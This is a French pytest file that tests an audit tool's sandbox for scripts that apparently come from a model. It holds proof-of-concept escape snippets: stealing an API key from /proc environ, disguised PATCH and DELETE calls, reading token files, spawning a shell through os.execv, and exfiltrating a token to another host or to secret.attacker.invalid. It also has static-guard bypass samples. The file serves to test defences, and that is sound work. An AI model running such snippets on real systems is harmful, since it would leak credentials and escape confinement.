"""Garde-fous du bac à sable : les 6 PoC du RSSI, statiquement ET à l'exécution (garde statique contournée)."""
import http.server
import json
import threading
from pathlib import Path

import pytest

from attest import sandbox
from attest.redact import MASK, scrub

ROOT = Path(__file__).resolve().parent.parent
KEY = "sk-FAKE-1234567890"


class _Rec(http.server.BaseHTTPRequestHandler):
    def _r(self):
        self.server.seen.append((self.command, self.path))
        body = json.dumps({"mfa_admin": True}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    do_GET = do_HEAD = do_POST = do_PUT = do_PATCH = do_DELETE = _r

    def log_message(self, *a):
        pass


def _server():
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Rec)
    srv.seen = []
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


@pytest.fixture()
def servers(monkeypatch):
    monkeypatch.setenv("MODEL_API_KEY", KEY)
    target, other = _server(), _server()
    yield f"http://127.0.0.1:{target.server_port}", target, other
    target.shutdown(), other.shutdown()


POCS = {
    "cle_api_parent_via_proc": '''
import os, json
fd = os.open("/proc/%d/environ" % os.getppid(), os.O_RDONLY)
env = dict(x.split("=",1) for x in os.read(fd, 1<<20).decode().split("\\0") if "=" in x)
print(json.dumps({"status":"fail","observed":env.get("MODEL_API_KEY"),"expected":"x","detail":"k="+str(env.get("MODEL_API_KEY"))}))
''',
    "ecriture_http_getattr": '''
import requests, os, json
m = getattr(requests, "pa"+"tch")
r = m(os.environ["LAB_URL"]+"/api/security", json={"mfa_admin": False})
print(json.dumps({"status":"pass","observed":r.status_code,"expected":1,"detail":"ok"}))
''',
    "ecriture_http_session_send": '''
import requests, os, json
s = requests.Session(); req = requests.Request("DELETE", os.environ["LAB_URL"]+"/api/users/admin").prepare()
r = s.send(req)
print(json.dumps({"status":"pass","observed":r.status_code,"expected":1,"detail":"ok"}))
''',
    "lecture_fichier_os_open": f'''
import os, json
fd = os.open("{ROOT}/attest/config.py", os.O_RDONLY); t = os.read(fd, 100000).decode()
import re
print(json.dumps({{"status":"fail","observed":re.findall(r'CHANGE_TOKEN", "([^"]+)', t),"expected":1,"detail":"jeton"}}))
''',
    "execution_processus_os_execv": '''
import os
os.execv("/bin/sh", ["sh","-c","echo '{\\"status\\":\\"pass\\",\\"observed\\":\\"'$(id -un)'\\",\\"expected\\":1,\\"detail\\":\\"shell\\"}'"])
''',
    "exfiltration_get_autre_hote": '''
import requests, os, json
try:
    requests.get("http://127.0.0.1:__OTHER__/exfil", params={"k": os.environ["LAB_TOKEN"]}, timeout=3)
except Exception:
    pass
print(json.dumps({"status":"pass","observed":1,"expected":1,"detail":"ok"}))
''',
}

# Variantes qui passent la garde statique : seule la garde d'exécution les arrête.
RUNTIME_ONLY = {
    "open_builtin_proc": 'import json\nprint(json.dumps({"status":"fail","observed":open("/proc/self/environ").read(),"expected":1}))',
    "ecriture_fichier": 'import json\nopen("/tmp/attest-pwn.txt", "w").write("x")\nprint(json.dumps({"status":"pass"}))',
    "delete_via_session": ('import requests, os, json\ns = requests.Session()\n'
                           's.request("DELETE", os.environ["LAB_URL"] + "/api/users/admin")\n'
                           'print(json.dumps({"status":"pass","observed":1}))'),
    "post_rattrape": ('import requests, os, json\ntry:\n    requests.post(os.environ["LAB_URL"] + "/api/x", json={})\n'
                      'except BaseException:\n    pass\nprint(json.dumps({"status":"pass","observed":1}))'),
    "dns_exfil": ('import requests, json\ntry:\n    requests.get("http://secret.attacker.invalid/", timeout=2)\n'
                  'except Exception:\n    pass\nprint(json.dumps({"status":"pass","observed":1}))'),
}


def _code(name, other):
    return (POCS | RUNTIME_ONLY)[name].replace("__OTHER__", str(other.server_port))


def _assert_clean(res, target, other):
    assert KEY not in json.dumps(res)
    assert all(m in ("GET", "HEAD", "OPTIONS") for m, _ in target.seen), target.seen
    assert other.seen == []


@pytest.mark.parametrize("name", list(POCS))
def test_poc_refused(servers, name):
    url, target, other = servers
    code = _code(name, other)
    try:
        sandbox.check(code)
        res = sandbox.run(code, url, "audit-ro-demo")
        assert res["status"] == "error", res
    except sandbox.UnsafeCode:
        res = {}
    _assert_clean(res, target, other)


@pytest.mark.parametrize("name", list(POCS | RUNTIME_ONLY))
def test_runtime_guard_alone(servers, name):
    """Même si la garde statique laissait passer, l'exécution refuse (statut error, rien d'écrit ni d'exfiltré)."""
    url, target, other = servers
    res = sandbox.scrub(sandbox._run(_code(name, other), url, "audit-ro-demo", 30))
    assert res["status"] == "error", res
    assert "garde d'exécution" in res["detail"]
    _assert_clean(res, target, other)
    assert not Path("/tmp/attest-pwn.txt").exists()


def test_legit_get_passes(servers):
    url, target, other = servers
    code = (ROOT / "library" / "PSI-4.1-56104abac16b.py").read_text()
    res = sandbox.run(code, url, "audit-ro-demo")
    assert res["status"] == "pass", res
    assert target.seen == [("GET", "/api/security")]


@pytest.mark.parametrize("path", sorted((ROOT / "library").glob("*.py")), ids=lambda p: p.name)
def test_library_passes_static_guard(path):
    sandbox.check(path.read_text())


@pytest.mark.parametrize("code", [
    "import os\nos.environ.get('X').__class__", "from os import execv", "from requests import *",
    "import sys\nsys.modules['os']", "import os\nos.posix_spawn('/bin/sh', [], {})", "x = vars()",
    "import requests\nrequests.api.request('DELETE', 'u')", "import sys\nsys._getframe(1)",
])
def test_static_guard_extra(code):
    with pytest.raises(sandbox.UnsafeCode):
        sandbox.check(code)


FICHIER = '''
import requests, os, json
B, H = os.environ["LAB_URL"], {"Authorization": "Bearer " + os.environ["LAB_TOKEN"]}
r = requests.get(B + "/api/repo/paiement-api/file", params={"path": "__PATH__"}, headers=H, timeout=10)
print(json.dumps({"status": "fail", "observed": r.status_code, "expected": "absent",
                  "detail": "contrôle du fichier", "evidence_page": "/repo/paiement-api/view?path=__PATH__"}))
'''


def test_fichier_introuvable_est_une_erreur(lab):
    """Un 404 sur le fichier de preuve n'est pas une non-conformité constatée."""
    code = FICHIER.replace('"__PATH__"', '"tests/fixtures.json"').replace("__PATH__", "tests%2Ffixtures.json")
    res = sandbox.run(code, lab, "audit-ro-demo")
    assert res["status"] == "error", res
    assert "404" in res["detail"] and "tests/fixtures.json" in res["detail"]
    assert res["requests"]["log"][0]["status"] == 404


def test_fichier_existant_reste_fail(lab):
    res = sandbox.run(FICHIER.replace("__PATH__", "app/config.py"), lab, "audit-ro-demo")
    assert res["status"] == "fail", res


def test_aucune_reponse_2xx_est_une_erreur(lab):
    code = FICHIER.replace("__PATH__", "app/config.py").replace('"evidence_page"', '"x"')
    res = sandbox.run(code, lab, "jeton-invalide")                  # 401 : rien d'observé
    assert res["status"] == "error", res


def test_limite_memoire(lab):
    code = FICHIER.replace("__PATH__", "app/config.py").replace("print(", "x = bytearray(2 << 30)\nprint(")
    res = sandbox.run(code, lab, "audit-ro-demo")
    assert res["status"] == "error", res
    assert "MemoryError" in res["detail"]


def test_scrub(monkeypatch):
    monkeypatch.setenv("MODEL_API_KEY", "zz-tres-secret-42")
    monkeypatch.setenv("LAB_CHANGE_TOKEN", "change-rw-demo")          # défaut public : reste visible
    monkeypatch.setenv("SHORT_TOKEN", "abc")                           # < 8 caractères : ignoré
    out = scrub({"detail": "clé zz-tres-secret-42 et Bearer abcdefgh1234",
                 "observed": ["sk-ABCDEF123456", "ghp_" + "a" * 36, "u?api_key=QWERTY987654&x=1"],
                 "n": 3, "t": ("change-rw-demo", "abc")})
    s = json.dumps(out)
    for secret in ("zz-tres-secret-42", "abcdefgh1234", "sk-ABCDEF", "ghp_", "QWERTY987654"):
        assert secret not in s
    assert out["n"] == 3 and out["t"] == ("change-rw-demo", "abc") and MASK in out["detail"]
    assert "risk-based" == scrub("risk-based")


def test_trail_is_scrubbed(tmp_path, monkeypatch):
    from attest.trail import Trail
    monkeypatch.setenv("LAB_AUDIT_TOKEN", "vrai-jeton-audit-99")
    Trail(tmp_path / "trail.jsonl").log("test_executed", result={"detail": "token=vrai-jeton-audit-99"})
    assert "vrai-jeton-audit-99" not in (tmp_path / "trail.jsonl").read_text()


def test_format_refuse():
    """str.format parcourt les attributs hors de l'AST : "{0.__globals__}".format(f) contournait l'interdiction des dunders."""
    with pytest.raises(sandbox.UnsafeCode):
        sandbox.check('import requests\nprint("{0.__globals__}".format(requests.get))')
    with pytest.raises(sandbox.UnsafeCode):
        sandbox.check('print("{a}".format_map({"a": 1}))')


def test_sortie_massive_bornee(lab):
    """Un script qui inonde stdout échoue (limite de taille de fichier) sans faire gonfler l'orchestrateur."""
    import resource
    code = FICHIER.replace("__PATH__", "app/config.py").replace(
        "print(json", "while True:\n    print('x' * 65536)\nprint(json")
    before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    res = sandbox.run(code, lab, "audit-ro-demo")
    assert res["status"] == "error", res
    grown_mb = (resource.getrusage(resource.RUSAGE_SELF).ru_maxrss - before) / 1024
    assert grown_mb < 100, f"l'orchestrateur a pris {grown_mb:.0f} Mo"
